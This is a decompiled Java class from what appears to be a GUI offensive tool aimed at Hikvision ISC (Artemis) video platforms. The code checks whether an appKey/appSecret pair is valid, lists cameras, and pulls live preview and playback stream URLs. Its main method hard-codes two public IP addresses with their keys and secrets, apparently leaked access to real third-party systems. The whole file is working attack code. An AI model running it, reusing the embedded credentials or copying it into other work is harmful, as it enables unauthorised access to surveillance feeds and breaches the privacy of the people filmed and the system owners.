/*
 * Decompiled with CFR 0.152.
 */
package plugins;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.serializer.SerializerFeature;
import com.hikvision.artemis.sdk.ArtemisHttpUtil;
import com.hikvision.artemis.sdk.config.ArtemisConfig;
import controller.MainController;
import java.util.HashMap;
import java.util.Map;
import utils.ControllerFactory;
import utils.Util;

public class HikVision {
    private final MainController mainController = (MainController)ControllerFactory.controllers.get(MainController.class.getSimpleName());
    private static final String ARTEMIS_PATH = "/artemis";
    private static final String GetRegions_V1_V2 = "/api/resource/v1/regions/root";
    private static final String CameraSearch_V1 = "/api/resource/v1/cameras";
    private static final String CameraSearch_V2 = "/api/resource/v2/camera/search";
    private static final String CameraPreview_V1 = "/api/video/v1/cameras/previewURLs";
    private static final String CameraPreview_V2 = "/api/video/v2/cameras/previewURLs";
    private static final String CameraPlayback_V1 = "/api/video/v1/cameras/playbackURLs";
    private static final String CameraPlayback_V2 = "/api/video/v2/cameras/playbackURLs";

    public HikVision(String host, String appKey, String appSecret) {
        ArtemisConfig.host = host;
        ArtemisConfig.appKey = appKey;
        ArtemisConfig.appSecret = appSecret;
    }

    public static Map<String, Object> publicHkInterface(JSONObject jsonBody, String url) {
        String getCamsApi = ARTEMIS_PATH + url;
        HashMap<String, String> path = new HashMap<String, String>(2);
        path.put("https://", getCamsApi);
        String result = ArtemisHttpUtil.doPostStringArtemis(path, jsonBody.toJSONString(), null, null, "application/json", null);
        return Util.getStringToMap(result);
    }

    public Map<String, Object> getRegions() {
        JSONObject jsonBody = new JSONObject();
        return HikVision.publicHkInterface(jsonBody, GetRegions_V1_V2);
    }

    public Map<String, Object> search1() {
        JSONObject jsonBody = new JSONObject();
        jsonBody.put("pageNo", (Object)1);
        jsonBody.put("pageSize", (Object)100);
        return HikVision.publicHkInterface(jsonBody, CameraSearch_V1);
    }

    public Map<String, Object> search2() {
        JSONObject jsonBody = new JSONObject();
        jsonBody.put("pageNo", (Object)1);
        jsonBody.put("pageSize", (Object)100);
        return HikVision.publicHkInterface(jsonBody, CameraSearch_V2);
    }

    public Map<String, Object> preview1(String indexCode) {
        JSONObject jsonBody = new JSONObject();
        jsonBody.put("cameraIndexCode", (Object)indexCode);
        return HikVision.publicHkInterface(jsonBody, CameraPreview_V1);
    }

    public Map<String, Object> preview2(String indexCode) {
        JSONObject jsonBody = new JSONObject();
        jsonBody.put("cameraIndexCode", (Object)indexCode);
        return HikVision.publicHkInterface(jsonBody, CameraPreview_V2);
    }

    public Map<String, Object> playback1(String indexCode) {
        JSONObject jsonBody = new JSONObject();
        jsonBody.put("cameraIndexCode", (Object)indexCode);
        return HikVision.publicHkInterface(jsonBody, CameraPlayback_V1);
    }

    public Map<String, Object> playback2(String indexCode) {
        JSONObject jsonBody = new JSONObject();
        jsonBody.put("cameraIndexCode", (Object)indexCode);
        jsonBody.put("beginTime", (Object)"2022-11-28T13:46:59.932+08:00");
        jsonBody.put("endTime", (Object)"2022-11-28T13:50:59.932+08:00");
        return HikVision.publicHkInterface(jsonBody, CameraPlayback_V2);
    }

    public void checkValid() {
        this.mainController.result1.appendText("[+] \u5f00\u59cb\u9a8c\u8bc1api\u6709\u6548\u6027\n");
        try {
            Map<String, Object> resp1 = this.getRegions();
            String msg1 = (String)resp1.get("msg");
            if (msg1.equalsIgnoreCase("SUCCESS")) {
                System.out.println("[+] api\u6709\u6548!");
                this.mainController.result1.appendText("[+] api\u6709\u6548!\n\n");
                this.mainController.search1.setDisable(false);
            } else {
                System.out.println("[-] api\u65e0\u6548!");
                this.mainController.result1.appendText("[-] api\u65e0\u6548!\n\n");
                this.mainController.search1.setDisable(true);
            }
        }
        catch (Exception e) {
            System.out.println("[-] api\u65e0\u6548!");
            this.mainController.result1.appendText("[-] api\u65e0\u6548!\n\n");
            this.mainController.search1.setDisable(true);
        }
    }

    public void checkSearch() {
        this.mainController.result1.appendText("[+] \u5f00\u59cb\u9a8c\u8bc1\u641c\u7d22\u89c6\u9891\u8d44\u6e90\n");
        try {
            Map<String, Object> resp1 = this.search1();
            Map<String, Object> resp2 = this.search2();
            if (resp1.containsKey("msg")) {
                this.CheckSearch(resp1);
                this.mainController.result1.appendText("[+] isc \u5e73\u53f0 1.4 \u4ee5\u4e0b\u7248\u672c, api \u4e3a /api/resource/v1/cameras");
            } else if (resp2.containsKey("msg")) {
                this.CheckSearch(resp2);
                this.mainController.result1.appendText("[+] isc \u5e73\u53f0 1.4 \u4ee5\u4e0b\u7248\u672c, api \u4e3a /api/resource/v2/camera/search");
            } else {
                System.out.println("[-] \u672a\u83b7\u53d6\u5230\u89c6\u9891\u8d44\u6e90");
                this.mainController.result1.appendText("[-] \u672a\u83b7\u53d6\u5230\u89c6\u9891\u8d44\u6e90\n\n");
                this.mainController.getPreview.setDisable(true);
            }
        }
        catch (Exception e) {
            System.out.println("[-] \u672a\u83b7\u53d6\u5230\u89c6\u9891\u8d44\u6e90");
            this.mainController.result1.appendText("[-] \u672a\u83b7\u53d6\u5230\u89c6\u9891\u8d44\u6e90\n\n");
            this.mainController.getPreview.setDisable(true);
        }
    }

    private void CheckSearch(Map<String, Object> resp) {
        String msg2 = (String)resp.get("msg");
        if (msg2.equalsIgnoreCase("SUCCESS")) {
            System.out.println(resp.get("data"));
            System.out.println("[+] \u83b7\u53d6\u5230\u89c6\u9891\u8d44\u6e90");
            String pretty = JSON.toJSONString(resp, SerializerFeature.PrettyFormat, SerializerFeature.WriteMapNullValue, SerializerFeature.WriteDateUseDateFormat);
            this.mainController.result1.appendText("[+] \u83b7\u53d6\u5230\u89c6\u9891\u8d44\u6e90\n");
            this.mainController.result1.appendText(pretty + "\n\n");
            this.mainController.getPreview.setDisable(false);
        }
    }

    public void checkPreview(String indexCode) {
        this.mainController.result1.appendText("[+] \u5f00\u59cb\u83b7\u53d6\u9884\u89c8\u5730\u5740\n");
        try {
            Map<String, Object> resp1 = this.preview1(indexCode);
            Map<String, Object> resp2 = this.preview2(indexCode);
            if (resp1.containsKey("msg")) {
                this.CheckPreview(resp1);
            } else if (resp2.containsKey("msg")) {
                this.CheckPreview(resp2);
            } else {
                System.out.println("[-] \u672a\u83b7\u53d6\u5230\u9884\u89c8\u5730\u5740");
                this.mainController.result1.appendText("[-] \u672a\u83b7\u53d6\u5230\u9884\u89c8\u5730\u5740\n\n");
            }
        }
        catch (Exception e) {
            System.out.println("[-] \u672a\u83b7\u53d6\u5230\u9884\u89c8\u5730\u5740");
            this.mainController.result1.appendText("[-] \u672a\u83b7\u53d6\u5230\u9884\u89c8\u5730\u5740\n\n");
        }
    }

    private void CheckPreview(Map<String, Object> resp) {
        String msg2 = (String)resp.get("msg");
        if (msg2.equalsIgnoreCase("success")) {
            System.out.println(resp.get("data"));
            System.out.println("[+] \u83b7\u53d6\u5230\u9884\u89c8\u5730\u5740");
            String pretty = JSON.toJSONString(resp, SerializerFeature.PrettyFormat, SerializerFeature.WriteMapNullValue, SerializerFeature.WriteDateUseDateFormat);
            this.mainController.result1.appendText("[+] \u83b7\u53d6\u5230\u9884\u89c8\u5730\u5740\n");
            this.mainController.result1.appendText(pretty + "\n\n");
        }
    }

    public void MainCheck() {
        this.playback2("7c8fc6304fed4523b3bd60c7154596a7");
    }

    public static void main(String[] args) throws Exception {
        String host = "218.205.89.162:2020";
        String appKey = "22343511";
        String appSecret = "8efsJRNoIz29hRMooFRW";
        host = "218.108.67.197:443";
        appKey = "20640094";
        appSecret = "JxwfujRb3uLAJpXQwPSi";
        HikVision app = new HikVision(host, appKey, appSecret);
        app.MainCheck();
    }
}
